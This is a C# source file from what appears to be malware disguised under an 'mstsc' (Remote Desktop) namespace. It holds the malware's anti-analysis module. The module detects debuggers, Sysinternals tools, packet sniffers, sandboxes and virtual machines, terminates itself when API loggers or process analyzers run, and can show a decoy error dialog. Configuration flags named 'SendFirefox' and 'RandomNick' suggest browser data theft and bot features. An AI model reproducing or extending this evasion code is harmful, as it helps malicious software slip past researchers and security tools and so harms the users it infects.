using System;

namespace mstsc.Aries.Antis
{
    sealed class ProcessAntis
    {
        public enum Type : int
        {
            ShowVirtualOnly = 3,
            UseErrorMsg = 4,
            AntiSandbox = 6,
            SendFirefox = 9,
            AntiVirtual = 10,
            RandomNick = 11
        }

        public static bool UseAnti(Type type)
        {
            return Convert.ToBoolean(Microsoft.VisualBasic.Strings.Split(Config.ErrAnti[(int)type], Config.FSplit2, -1, Microsoft.VisualBasic.CompareMethod.Text)[0]);
        }

        public void Process()
        {
            Config config = new Config();

            new CheckDebugger();
            CheckProcess proc = new CheckProcess();
            if (Convert.ToBoolean(config.SafeAnti(Config.SafeAntiType.AntiSysInternals))) { new SysInternals(); }

            if (proc.IsProcessRunning("api_logger") || proc.IsProcessRunning("api_logger") || Util.GetModuleHandle("api_log.dll").ToInt32() != 0 ||
                    proc.IsProcessRunning("proc_analyzer")) { Environment.FailFast(new Random().Next(5, 100).ToString()); }

            if (Convert.ToBoolean(config.SafeAnti(Config.SafeAntiType.AntiSniffDebug))) { new Sniffers(); }

            if (UseAnti(Type.AntiSandbox)) { new Sandbox(); }

            if (UseAnti(Type.AntiVirtual))
            {
                if (new Virtualized().IsVirtual())
                    new AntiFound();
            }

            if (UseAnti(Type.UseErrorMsg))
            {
                if (UseAnti(Type.ShowVirtualOnly))
                {
                    if (new Virtualized().IsVirtual())
                    {
                        Config AntiConfig = new Config();
                        System.Windows.Forms.MessageBox.Show(
                            AntiConfig.Anti(Config.AntiType.ErrorBody),
                            AntiConfig.Anti(Config.AntiType.ErrorTitle),
                            System.Windows.Forms.MessageBoxButtons.OK,
                            new Config.Settings_().GetIcon);
                    }
                }
                else
                {
                    Config AntiConfig = new Config();
                    System.Windows.Forms.MessageBox.Show(
                        AntiConfig.Anti(Config.AntiType.ErrorBody),
                        AntiConfig.Anti(Config.AntiType.ErrorTitle),
                        System.Windows.Forms.MessageBoxButtons.OK,
                        new Config.Settings_().GetIcon);
                }
            }
            Util.AntiCheckComplete = true;
            //System.GC.Collect();
        }
    }
}
